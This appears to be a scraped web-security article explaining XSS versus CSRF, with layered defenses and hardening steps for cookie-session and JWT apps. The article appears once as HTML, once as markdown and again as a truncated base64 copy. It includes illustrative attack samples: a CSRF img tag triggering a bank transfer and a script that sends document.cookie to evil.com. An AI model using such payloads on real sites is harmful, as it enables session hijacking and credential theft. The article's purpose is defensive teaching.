+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">localStorage.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">setItem</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'token'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">, jwt)   </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// don't</span></span></code></pre></figure>
+<p><strong>B. Token in memory.</strong> A module variable or store, never persisted. It dies when the tab closes, so a stolen copy doesn't outlive the session. XSS can still read it while the tab is open. Replaces A.</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">let</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> accessToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">=</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5"> null</span></span>
+<span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">function</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> setToken</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#FFAB70;--shiki-light:#E36209">t</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">) { accessToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">=</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> t }</span></span></code></pre></figure>
+<p><strong>C. Short-lived access token in memory, refresh token in an <code>HttpOnly</code> cookie.</strong> The access token lives 5-15 min in a memory variable; the refresh token goes somewhere JS can never read. A stolen access token expires in minutes, and the valuable long-lived credential stays out of reach. Replaces B.</p>
+<pre><code>Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
+</code></pre>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// silent refresh, the browser sends the refresh cookie on its own</span></span>
+<span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">const</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5"> res</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> =</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> await</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> fetch</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'/auth/refresh'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">, { credentials: </span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'include'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> })</span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">accessToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">=</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> (</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">await</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> res.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">json</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">()).accessToken</span></span></code></pre></figure>
+<p>The refresh cookie auto-attaches, so <code>/auth/refresh</code> has a CSRF surface of its own. <code>SameSite=Strict</code> on that one cookie closes it. You've shrunk CSRF from the whole app to a single endpoint.</p>
+<p>The strongest JWT app is D plus C: keep XSS out, and if it ever gets in, make the token it can reach expire in minutes. No CSRF token is needed while auth stays in the header, since the JWT doesn't auto-attach. Any route still on cookie auth is a cookie app, defend it as one.</p>
+</details>
+<hr>
+<h2>References</h2>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP CSRF Prevention Cheat Sheet</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (MDN)</a></li>
+<li><a href="https://web.dev/articles/samesite-cookies-explained">SameSite cookies explained (web.dev)</a></li>
+<li><a href="https://web.dev/articles/trusted-types">Trusted Types (web.dev)</a></li>
+</ul>16:T48ee,
+You're logged into `bank.com`. In another tab you open `evil.com`. The page contains:
+
+```html
+<img src="https://bank.com/transfer?to=evil&amount=1000">
+```
+
+Your browser issues a request to `bank.com`. It sends your `bank.com` session cookie along, because that's what browsers do for any request to that origin. The transfer goes through.
+
+That's CSRF. You didn't click anything. The attacker borrowed your authenticated session by tricking your browser into making a request.
+
+---
+
+Now a different scenario. You visit `forum.com` and read someone's comment. The comment contains:
+
+```html
+<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
+```
+
+If `forum.com` rendered the comment as raw HTML without escaping, the script runs inside `forum.com`'s origin. Full access to its DOM, cookies (unless `HttpOnly`), and localStorage. The attacker reads your session.
+
+That's XSS. The attacker injected code that runs as if `forum.com` wrote it.
+
+---
+
+Two attackers, standing in different places. The CSRF one is **outside** your page. He can't reach in, so the most he can do is trick your browser into sending a request on his behalf. The XSS one gets his code running **inside** your page, and once he is in, he is you. Everything below follows from that one line between outside and inside. It decides which defense stops which attacker, and why a single failure takes down the rest.
+
+The short version, before the details: great CSRF defense with no XSS protection is a locked front door beside an open window. The rest explains why.
+
+---
+
+## Two attacks, two threat models
+
+**XSS**: <mark>code I didn't write running in my origin.</mark> Attacker delivers payload via stored content (comments, profile fields), reflected URL parameters, or DOM manipulation. Once it runs, it has full origin privileges: read non-HttpOnly cookies, localStorage, page state. Issue requests as user. The trust it exploits is the page's trust in user-supplied content.
+
+**CSRF**: <mark>my browser sending a request I didn't intend.</mark> Attacker controls a different origin, embeds something (image, form, fetch) that triggers a request to the target. Browser attaches the target's cookies automatically, server can't tell it's not legit from the cookie alone. The trust it exploits is the browser's automatic cookie attachment.
+
+Because the trust being exploited differs, the defenses differ too, and they live in different layers.
+
+---
+
+## Architecture decides the threat surface
+
+How your app authenticates determines which threat dominates.
+
+**Cookie sessions** (server sets a session cookie, browser sends it automatically on every request to that origin):
+
+- Vulnerable to CSRF. Any cross-origin request can carry your cookie.
+- XSS still dangerous. Reads non-HttpOnly cookies, issues same-origin requests with full session.
+
+**Token auth** (JWT or similar in `Authorization` header):
+
+- CSRF largely goes away. No cookie auto-attaches, so a forged request lacks credentials.
+- XSS becomes existential. If the token sits in `localStorage`, an XSS payload reads it and is now the user, on any device, until expiry.
+
+Modern SPAs often use tokens. Apps rendered on the server usually use cookies. Both styles are still common, but the way you defend each one is different.
+
+---
+
+## XSS defenses, layered
+
+| Layer | Who | What |
+|---|---|---|
+| Output encoding | Client | Use the framework's interpolation (`{value}`). Stop reaching for `innerHTML` / `dangerouslySetInnerHTML` / `v-html`. |
+| Sanitization | Client | DOMPurify. Don't roll your own. |
+| Content Security Policy | Server | `script-src 'self' 'nonce-RANDOM'`. Anything that doesn't fit gets rejected by the browser. |
+| HttpOnly cookies | Server | `Set-Cookie: ...; HttpOnly`. JS can't read it. <mark>Caveat below.</mark> |
+| Stored content sanitization | Server | Clean on input. Clean on output too. Belt and suspenders. |
+| `X-Content-Type-Options` | Server | `nosniff`. Browser stops guessing what files are, so your image upload doesn't get rendered as script. |
+| Trusted Types | Client + Server | CSP directive that forces HTML injection sinks through a sanitizer. Catches the bug before ship. |
+
+The first two rows handle most of the job, and the rest are there as extra safety nets.
+
+The CSP row needs unpacking. With `script-src 'self' 'nonce-abc123'`, the server stamps every legitimate `<script>` tag with that nonce, and the browser executes only the tags carrying it. Injected scripts don't have it, and the nonce changes on every request, so capturing one buys nothing.
+
+<details>
+<summary>Deeper: why XSS can't fake the nonce</summary>
+
+The server generates the nonce and the browser checks it, so the attacker, who controls neither side, has nothing to work with.
+
+When the browser parses the response, it copies each `nonce` into an internal slot for CSP checks, then **wipes the attribute from JS reads**:
+
+```js
+document.querySelector('script[nonce]').nonce              // ""
+document.querySelector('script[nonce]').getAttribute('nonce') // ""
+```
+
+With a 128-bit random regenerated per request, there's nothing left to read, duplicate, or brute-force. Nonce hiding shipped in Chrome 49 (2016), Firefox 31, Safari 11. Universal today.
+
+`eval` family (`eval`, `new Function`, `setTimeout(string)`) is also blocked by default CSP since `'unsafe-eval'` isn't on unless you ask for it.
+
+Only breaks if you misconfigure: `'unsafe-inline'` cancels nonce checks, `'unsafe-eval'` opens eval, static or low-entropy nonce is replayable, `'strict-dynamic'` can be leveraged via a controllable loader. All config bugs, not mechanism flaws.
+
+</details>
+
+<details>
+<summary>Deeper: nosniff is a serve-back decision, not an upload one</summary>
+
+`X-Content-Type-Options` and the `Content-Type` it protects are both set by your server when it sends a stored file back, not when the file is uploaded. They are two separate trips:
+
+- **Upload** (a user sends you a file). The `Content-Type` on that request is whatever the uploader chose, so it is attacker-controlled. Don't store it and reuse it later.
+- **Serve-back** (your server returns the file to a viewer). Here your server sets the `Content-Type` itself, normally from the file extension (`.png` becomes `image/png`), and adds `nosniff`. This response is where the decision happens.
+
+`nosniff` tells the viewer's browser to trust the `Content-Type` from the serve-back and never re-guess it from the bytes. So it only protects you if that `Content-Type` is correct. Serve a malicious `avatar.png` as `image/png` and the browser treats it as an image (a broken one), never as a script. Serve it as `text/html` because you copied the uploader's value, and `nosniff` will trust that and render a page. The header only enforces your label, so the label has to be right first.
+
+The victim is a third party: an attacker uploads a file with a script inside, your server stores it, and a different user opens its URL. Execution needs the file to be opened as a document (a direct navigation). Loaded through `<img>`, the same file only ever decodes as image bytes and never runs.
+
+</details>
+
+### Important: HttpOnly limits the damage, does not prevent XSS
+
+**`HttpOnly` stops XSS from reading the cookie value. It does not stop XSS from using the session.** XSS can still run `fetch('/transfer', ...)` from inside the origin, and the browser auto-attaches the HttpOnly cookie. The server authenticates the request normally.
+
+| Capability | Without `HttpOnly` | With `HttpOnly` |
+|---|---|---|
+| XSS reads `document.cookie` | ✅ | ❌ |
+| XSS exfiltrates cookie to attacker server | ✅ | ❌ |
+| XSS issues authenticated requests in victim's browser | ✅ | ✅ |
+| Attack persists after victim closes the tab | ✅ | ❌ |
+| Cookie replayed from a different device | ✅ | ❌ |
+
+Set `HttpOnly` anyway. It converts permanent credential theft into a tab-lifetime session hijack, which is a meaningful downgrade. But don't treat it as the XSS defense. The actual XSS defense is output encoding + CSP.
+
+<details>
+<summary>Deeper: in-memory tokens are still XSS-readable</summary>
+
+Putting a JWT or access token in memory (Zustand, React context, plain module variable) is **better than `localStorage`, not safe from XSS**. XSS runs in your origin. Any JS-reachable state is reachable:
+
+```js
+// XSS payload, knowing the store
+useAuthStore.getState().token
+// or scanning the React fiber tree, or grabbing closures via DevTools
+```
+
+The advantages over `localStorage` are real but they're about limiting the damage, not invisibility:
+
+- **Harder for a generic XSS template.** `localStorage.getItem('token')` works on every site. Reading a Zustand store needs knowledge of the store's reference, which varies per app. Drive-by XSS payloads collect 100% of `localStorage` tokens, much fewer in-memory ones.
+- **Once the user closes the tab, the token disappears along with it.** Close tab or reload, XSS gone, attacker loses the handle. `localStorage` persists across reloads, and stolen tokens replay from any device until expiry.
+
+Same logic as `HttpOnly` cookies: drop "permanent credential captured" down to "tab-lifetime session hijack." Combined with short-lived access tokens (5-15 min) and HttpOnly refresh cookies, the real damage window is small.
+
+</details>
+
+---
+
+## CSRF defenses, layered
+
+**Read this whole table assuming XSS is already prevented.** Almost every CSRF defense here stops working once an attacker has XSS, because XSS runs as your own origin and reads the token, the DOM, and the page state directly. The "Still works under XSS?" column makes that dependency visible.
+
+| Layer | Who | What | Still works under XSS? |
+|---|---|---|---|
+| `SameSite` cookie | Browser + Server | `Set-Cookie: ...; SameSite=Lax`. Blocks cross-site sub-resource requests. Browser default since Chrome 80 (2020), set it explicitly anyway. | No. XSS runs same-site, cookie attaches normally. |
+| `SameSite=Strict` | Server | `Set-Cookie: ...; SameSite=Strict`. Even top-level cross-site navigation skips the cookie. Use for admin / financial endpoints. | No. Same reason. |
+| CSRF token | Client + Server | Server plants a token in the form / response. State-changing requests must echo it back. `evil.com` can't read it (SOP), can't forge it. | No. XSS reads it from the DOM and includes it. |
+| `Origin` / `Referer` check | Server | Look at the header. If a request to your `/transfer` carries `Origin: evil.com`, reject it. | No. XSS requests carry your real `Origin`. |
+| Verb discipline | Server | GET never changes state. Image tags can fire GET, not POST. Forces attackers to write more. | No. XSS does any verb. |
+| Skip cookies | Architecture | JWT in `Authorization` header. No auto-attach, no CSRF surface. | No, worse. `localStorage` JWT is one line away from XSS. |
+| Re-auth / MFA on sensitive ops | Server + Client + User | Re-enter password / push a hardware key (WebAuthn, TOTP) before high-impact actions. | **Yes.** XSS can't fake a password or a hardware tap without the human. Only meaningful residual layer once XSS is in. |
+
+---
+
+## Why XSS dominates
+
+The table above already showed why: under XSS every standard CSRF layer stops working, and the only thing left is out-of-band re-auth, because XSS can't supply credentials it doesn't have.
+
+Practical priority:
+
+1. **Stop XSS first.** Framework auto-escape + CSP + sanitize stored input + nosniff, with `HttpOnly` capping the damage.
+2. **Then layer CSRF defenses on top.** SameSite + token + Origin check. These add value only when XSS is already prevented.
+3. **For high-stakes operations, add re-auth or MFA.** This is the only layer that still works after a successful XSS, because it depends on something XSS can't fake.
+
+A site with great CSRF defenses and no XSS protection is a house with a locked front door and open windows. The attacker walks through a window and unlocks the door from inside.
+
+---
+
+## What I'd do today
+
+Same defenses, assembled per architecture. Each ladder starts from the naive version and adds one layer at a time.
+
+<details>
+<summary>Harden a cookie-session app, step by step</summary>
+
+Foundation first, same as the JWT app: CSP nonce, framework auto-escape, and nosniff. An XSS getting in voids every cookie and CSRF layer below it, so treat the anti-XSS layer as the floor, not a step you climb to later. Everything numbered below hardens the cookie itself and assumes that foundation is already in place.
+
+The numbered order then walks the cookie from naked to hardened. These steps are numbered, not lettered like the JWT ladder below, because each one stacks on the last: you finish with all of them, not one. That order follows implementation cost, not defense value. Two different axes, and they disagree:
+
+| Layer | Cost | Value |
+|---|---|---|
+| `HttpOnly` + `Secure` + `nosniff` | one line each | caps damage, does not stop the attack |
+| `SameSite` | one line | kills classic CSRF, nothing else |
+| CSRF token | wire every form | falls the moment XSS lands |
+| CSP nonce | real project work: the server generates a nonce per request, every template injects it, every third-party script gets audited. Miss one and the page breaks | highest value in the stack. It kills injected script at the execution step, and XSS is the attack that gets past every other layer |
+
+So the ladder order is for retrofitting an existing app without breaking it: cheap hygiene first, the expensive high-value layer when you can schedule it. Starting a fresh project? Do CSP on day one.
+
+**0. Bare cookie.** Everything is exposed: XSS can read it, CSRF can use it, and it travels in plaintext.
+
+```
+Set-Cookie: session=abc123
+```
+
+**1. Lock the cookie down, and ship the free header while you are here.** `HttpOnly` stops JS reading it, `Secure` keeps it off plaintext HTTP. `nosniff` is one line and belongs in this batch, even though it defends the script-execution layer covered in step 4.
+
+```
+Set-Cookie: session=abc123; HttpOnly; Secure; Path=/
+X-Content-Type-Options: nosniff
+```
+
+XSS can no longer exfiltrate it. It can still *use* the session from inside the page, so this is a downgrade, not a cure.
+
+**2. Kill classic CSRF with `SameSite`.** Cross-site sub-resource requests (the `<img src="bank.com/transfer">` trick) stop carrying the cookie.
+
+```
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+```
+
+Use `SameSite=Strict` for admin and money endpoints.
+
+**3. Add a CSRF token** on state-changing requests, since `SameSite` has edge cases.
+
+```html
+<form action="/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="{{ csrfToken }}">
+</form>
+```
+
+```js
+// server, on POST
+if (req.body.csrf_token !== session.csrfToken) return res.status(403).end()
+```
+
+**4. The foundation, written out.** CSP nonce and framework auto-escape (`nosniff` already shipped in step 1). This is the floor from the top of this list. If you started a fresh project here, the box is already ticked and everything above was the cheap hygiene you layered on after.
+
+```
+Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+```
+
+```jsx
+<div>{userInput}</div>   // safe, the framework escapes it
+// never feed user data to dangerouslySetInnerHTML / v-html / innerHTML
+```
+
+**5. Reject foreign `Origin`** on state-changing routes. Cheap second layer.
+
+```js
+if (req.method === 'POST' && req.headers.origin !== 'https://bank.com') return res.status(403).end()
+```
+
+**6. Re-auth on the dangerous stuff.** Transfer money, change email, delete account: re-enter password or tap a hardware key. The only layer that still holds if XSS gets in.
+
+</details>
+
+<details>
+<summary>Harden a JWT app, foundation first</summary>
+
+Do the foundation before you touch the token. Everything about where the token lives (A, B, C below) only limits the damage once XSS is already in. One layer keeps XSS out in the first place, so it comes first.
+
+**D. The foundation: stop XSS from running at all.** CSP nonce, framework auto-escape, nosniff, and re-auth on sensitive ops. A token sitting in `localStorage` behind solid CSP can be safer than a perfectly placed token with no CSP, because the second app still lets injected script run. This is the one layer that keeps the attacker out instead of just limiting the damage.
+
+```
+Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+X-Content-Type-Options: nosniff
+```
+
+Then choose where the token lives. These are lettered, not numbered like the cookie ladder above, because you pick one, not all: A, B, and C answer the single question of where the token sits, and each replaces the one before. Pick the furthest you can reach.
+
+**A. Token in `localStorage`.** The worst. One XSS line steals it, and it replays from any device until expiry.
+
+```js
+localStorage.setItem('token', jwt)   // don't
+```
+
+**B. Token in memory.** A module variable or store, never persisted. It dies when the tab closes, so a stolen copy doesn't outlive the session. XSS can still read it while the tab is open. Replaces A.
+
+```js
+let accessToken = null
+function setToken(t) { accessToken = t }
+```
+
+**C. Short-lived access token in memory, refresh token in an `HttpOnly` cookie.** The access token lives 5-15 min in a memory variable; the refresh token goes somewhere JS can never read. A stolen access token expires in minutes, and the valuable long-lived credential stays out of reach. Replaces B.
+
+```
+Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
+```
+
+```js
+// silent refresh, the browser sends the refresh cookie on its own
+const res = await fetch('/auth/refresh', { credentials: 'include' })
+accessToken = (await res.json()).accessToken
+```
+
+The refresh cookie auto-attaches, so `/auth/refresh` has a CSRF surface of its own. `SameSite=Strict` on that one cookie closes it. You've shrunk CSRF from the whole app to a single endpoint.
+
+The strongest JWT app is D plus C: keep XSS out, and if it ever gets in, make the token it can reach expire in minutes. No CSRF token is needed while auth stays in the header, since the JWT doesn't auto-attach. Any route still on cookie auth is a cookie app, defend it as one.
+
+</details>
+
+---
+
+## References
+
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [SameSite cookies explained (web.dev)](https://web.dev/articles/samesite-cookies-explained)
+- [Trusted Types (web.dev)](https://web.dev/articles/trusted-types)
+17:T6318,LS0tCnRpdGxlOiAiWFNTIGFuZCBDU1JGOiBhIGxvY2tlZCBkb29yIGFuZCBvcGVuIHdpbmRvd3MiCmNyZWF0ZWRBdDogMjAyNS0wMy0zMFQxNTozOTowMAp0YWdzOiBbc2VjdXJpdHksIHhzcywgY3NyZiwgd2ViLCBjb29raWVdCmRlc2NyaXB0aW9uOiAiWFNTIGFuZCBDU1JGIGJyZWFrIGRpZmZlcmVudCB0aGluZ3MgYW5kIGxpdmUgaW4gZGlmZmVyZW50IGxheWVycy4gRGVmZW5zZXMgc2NhdHRlciBhY3Jvc3MgY2xpZW50LCBzZXJ2ZXIsIGFuZCBicm93c2VyLiBIZXJlJ3MgdGhlIHNwbGl0LCBwbHVzIHN0ZXAtYnktc3RlcCBoYXJkZW5pbmcgZm9yIGEgY29va2llLXNlc3Npb24gYXBwIGFuZCBhIEpXVCBhcHAuIgotLS0KCllvdSdyZSBsb2dnZWQgaW50byBgYmFuay5jb21gLiBJbiBhbm90aGVyIHRhYiB5b3Ugb3BlbiBgZXZpbC5jb21gLiBUaGUgcGFnZSBjb250YWluczoKCmBgYGh0bWwKPGltZyBzcmM9Imh0dHBzOi8vYmFuay5jb20vdHJhbnNmZXI/dG89ZXZpbCZhbW91bnQ9MTAwMCI+CmBgYAoKWW91ciBicm93c2VyIGlzc3VlcyBhIHJlcXVlc3QgdG8gYGJhbmsuY29tYC4gSXQgc2VuZHMgeW91ciBgYmFuay5jb21gIHNlc3Npb24gY29va2llIGFsb25nLCBiZWNhdXNlIHRoYXQncyB3aGF0IGJyb3dzZXJzIGRvIGZvciBhbnkgcmVxdWVzdCB0byB0aGF0IG9yaWdpbi4gVGhlIHRyYW5zZmVyIGdvZXMgdGhyb3VnaC4KClRoYXQncyBDU1JGLiBZb3UgZGlkbid0IGNsaWNrIGFueXRoaW5nLiBUaGUgYXR0YWNrZXIgYm9ycm93ZWQgeW91ciBhdXRoZW50aWNhdGVkIHNlc3Npb24gYnkgdHJpY2tpbmcgeW91ciBicm93c2VyIGludG8gbWFraW5nIGEgcmVxdWVzdC4KCi0tLQoKTm93IGEgZGlmZmVyZW50IHNjZW5hcmlvLiBZb3UgdmlzaXQgYGZvcnVtLmNvbWAgYW5kIHJlYWQgc29tZW9uZSdzIGNvbW1lbnQuIFRoZSBjb21tZW50IGNvbnRhaW5zOgoKYGBgaHRtbAo8c2NyaXB0PmZldGNoKCdodHRwczovL2V2aWwuY29tL3N0ZWFsP2M9JyArIGRvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4KYGBgCgpJZiBgZm9ydW0uY29tYCByZW5kZXJlZCB0aGUgY29tbWVudCBhcyByYXcgSFRNTCB3aXRob3V0IGVzY2FwaW5nLCB0aGUgc2NyaXB0IHJ1bnMgaW5zaWRlIGBmb3J1bS5jb21gJ3Mgb3JpZ2luLiBGdWxsIGFjY2VzcyB0byBpdHMgRE9NLCBjb29raWVzICh1bmxlc3MgYEh0dHBPbmx5YCksIGFuZCBsb2NhbFN0b3JhZ2UuIFRoZSBhdHRhY2tlciByZWFkcyB5b3VyIHNlc3Npb24uCgpUaGF0J3MgWFNTLiBUaGUgYXR0YWNrZXIgaW5qZWN0ZWQgY29kZSB0aGF0IHJ1bnMgYXMgaWYgYGZvcnVtLmNvbWAgd3JvdGUgaXQuCgotLS0KClR3byBhdHRhY2tlcnMsIHN0YW5kaW5nIGluIGRpZmZlcmVudCBwbGFjZXMuIFRoZSBDU1JGIG9uZSBpcyAqKm91dHNpZGUqKiB5b3VyIHBhZ2UuIEhlIGNhbid0IHJlYWNoIGluLCBzbyB0aGUgbW9zdCBoZSBjYW4gZG8gaXMgdHJpY2sgeW91ciBicm93c2VyIGludG8gc2VuZGluZyBhIHJlcXVlc3Qgb24gaGlzIGJlaGFsZi4gVGhlIFhTUyBvbmUgZ2V0cyBoaXMgY29kZSBydW5uaW5nICoqaW5zaWRlKiogeW91ciBwYWdlLCBhbmQgb25jZSBoZSBpcyBpbiwgaGUgaXMgeW91LiBFdmVyeXRoaW5nIGJlbG93IGZvbGxvd3MgZnJvbSB0aGF0IG9uZSBsaW5lIGJldHdlZW4gb3V0c2lkZSBhbmQgaW5zaWRlLiBJdCBkZWNpZGVzIHdoaWNoIGRlZmVuc2Ugc3RvcHMgd2hpY2ggYXR0YWNrZXIsIGFuZCB3aHkgYSBzaW5nbGUgZmFpbHVyZSB0YWtlcyBkb3duIHRoZSByZXN0LgoKVGhlIHNob3J0IHZlcnNpb24sIGJlZm9yZSB0aGUgZGV0YWlsczogZ3JlYXQgQ1NSRiBkZWZlbnNlIHdpdGggbm8gWFNTIHByb3RlY3Rpb24gaXMgYSBsb2NrZWQgZnJvbnQgZG9vciBiZXNpZGUgYW4gb3BlbiB3aW5kb3cuIFRoZSByZXN0IGV4cGxhaW5zIHdoeS4KCi0tLQoKIyMgVHdvIGF0dGFja3MsIHR3byB0aHJlYXQgbW9kZWxzCgoqKlhTUyoqOiA8bWFyaz5jb2RlIEkgZGlkbid0IHdyaXRlIHJ1bm5pbmcgaW4gbXkgb3JpZ2luLjwvbWFyaz4gQXR0YWNrZXIgZGVsaXZlcnMgcGF5bG9hZCB2aWEgc3RvcmVkIGNvbnRlbnQgKGNvbW1lbnRzLCBwcm9maWxlIGZpZWxkcyksIHJlZmxlY3RlZCBVUkwgcGFyYW1ldGVycywgb3IgRE9NIG1hbmlwdWxhdGlvbi4gT25jZSBpdCBydW5zLCBpdCBoYXMgZnVsbCBvcmlnaW4gcHJpdmlsZWdlczogcmVhZCBub24tSHR0cE9ubHkgY29va2llcywgbG9jYWxTdG9yYWdlLCBwYWdlIHN0YXRlLiBJc3N1ZSByZXF1ZXN0cyBhcyB1c2VyLiBUaGUgdHJ1c3QgaXQgZXhwbG9pdHMgaXMgdGhlIHBhZ2UncyB0cnVzdCBpbiB1c2VyLXN1cHBsaWVkIGNvbnRlbnQuCgoqKkNTUkYqKjogPG1hcms+bXkgYnJvd3NlciBzZW5kaW5nIGEgcmVxdWVzdCBJIGRpZG4ndCBpbnRlbmQuPC9tYXJrPiBBdHRhY2tlciBjb250cm9scyBhIGRpZmZlcmVudCBvcmlnaW4sIGVtYmVkcyBzb21ldGhpbmcgKGltYWdlLCBmb3JtLCBmZXRjaCkgdGhhdCB0cmlnZ2VycyBhIHJlcXVlc3QgdG8gdGhlIHRhcmdldC4gQnJvd3NlciBhdHRhY2hlcyB0aGUgdGFyZ2V0J3MgY29va2llcyBhdXRvbWF0aWNhbGx5LCBzZXJ2ZXIgY2FuJ3QgdGVsbCBpdCdzIG5vdCBsZWdpdCBmcm9tIHRoZSBjb29raWUgYWxvbmUuIFRoZSB0cnVzdCBpdCBleHBsb2l0cyBpcyB0aGUgYnJvd3NlcidzIGF1dG9tYXRpYyBjb29raWUgYXR0YWNobWVudC4KCkJlY2F1c2UgdGhlIHRydXN0IGJlaW5nIGV4cGxvaXRlZCBkaWZmZXJzLCB0aGUgZGVmZW5zZXMgZGlmZmVyIHRvbywgYW5kIHRoZXkgbGl2ZSBpbiBkaWZmZXJlbnQgbGF5ZXJzLgoKLS0tCgojIyBBcmNoaXRlY3R1cmUgZGVjaWRlcyB0aGUgdGhyZWF0IHN1cmZhY2UKCkhvdyB5b3VyIGFwcCBhdXRoZW50aWNhdGVzIGRldGVybWluZXMgd2hpY2ggdGhyZWF0IGRvbWluYXRlcy4KCioqQ29va2llIHNlc3Npb25zKiogKHNlcnZlciBzZXRzIGEgc2Vzc2lvbiBjb29raWUsIGJyb3dzZXIgc2VuZHMgaXQgYXV0b21hdGljYWxseSBvbiBldmVyeSByZXF1ZXN0IHRvIHRoYXQgb3JpZ2luKToKCi0gVnVsbmVyYWJsZSB0byBDU1JGLiBBbnkgY3Jvc3Mtb3JpZ2luIHJlcXVlc3QgY2FuIGNhcnJ5IHlvdXIgY29va2llLgotIFhTUyBzdGlsbCBkYW5nZXJvdXMuIFJlYWRzIG5vbi1IdHRwT25seSBjb29raWVzLCBpc3N1ZXMgc2FtZS1vcmlnaW4gcmVxdWVzdHMgd2l0aCBmdWxsIHNlc3Npb24uCgoqKlRva2VuIGF1dGgqKiAoSldUIG9yIHNpbWlsYXIgaW4gYEF1dGhvcml6YXRpb25gIGhlYWRlcik6CgotIENTUkYgbGFyZ2VseSBnb2VzIGF3YXkuIE5vIGNvb2tpZSBhdXRvLWF0dGFjaGVzLCBzbyBhIGZvcmdlZCByZXF1ZXN0IGxhY2tzIGNyZWRlbnRpYWxzLgotIFhTUyBiZWNvbWVzIGV4aXN0ZW50aWFsLiBJZiB0aGUgdG9rZW4gc2l0cyBpbiBgbG9jYWxTdG9yYWdlYCwgYW4gWFNTIHBheWxvYWQgcmVhZHMgaXQgYW5kIGlzIG5vdyB0aGUgdXNlciwgb24gYW55IGRldmljZSwgdW50aWwgZXhwaXJ5LgoKTW9kZXJuIFNQQXMgb2Z0ZW4gdXNlIHRva2Vucy4gQXBwcyByZW5kZXJlZCBvbiB0aGUgc2VydmVyIHVzdWFsbHkgdXNlIGNvb2tpZXMuIEJvdGggc3R5bGVzIGFyZSBzdGlsbCBjb21tb24sIGJ1dCB0aGUgd2F5IHlvdSBkZWZlbmQgZWFjaCBvbmUgaXMgZGlmZmVyZW50LgoKLS0tCgojIyBYU1MgZGVmZW5zZXMsIGxheWVyZWQKCnwgTGF5ZXIgfCBXaG8gfCBXaGF0IHwKfC0tLXwtLS18LS0tfAp8IE91dHB1dCBlbmNvZGluZyB8IENsaWVudCB8IFVzZSB0aGUgZnJhbWV3b3JrJ3MgaW50ZXJwb2xhdGlvbiAoYHt2YWx1ZX1gKS4gU3RvcCByZWFjaGluZyBmb3IgYGlubmVySFRNTGAgLyBgZGFuZ2Vyb3VzbHlTZXRJbm5lckhUTUxgIC8gYHYtaHRtbGAuIHwKfCBTYW5pdGl6YXRpb24gfCBDbGllbnQgfCBET01QdXJpZnkuIERvbid0IHJvbGwgeW91ciBvd24uIHwKfCBDb250ZW50IFNlY3VyaXR5IFBvbGljeSB8IFNlcnZlciB8IGBzY3JpcHQtc3JjICdzZWxmJyAnbm9uY2UtUkFORE9NJ2AuIEFueXRoaW5nIHRoYXQgZG9lc24ndCBmaXQgZ2V0cyByZWplY3RlZCBieSB0aGUgYnJvd3Nlci4gfAp8IEh0dHBPbmx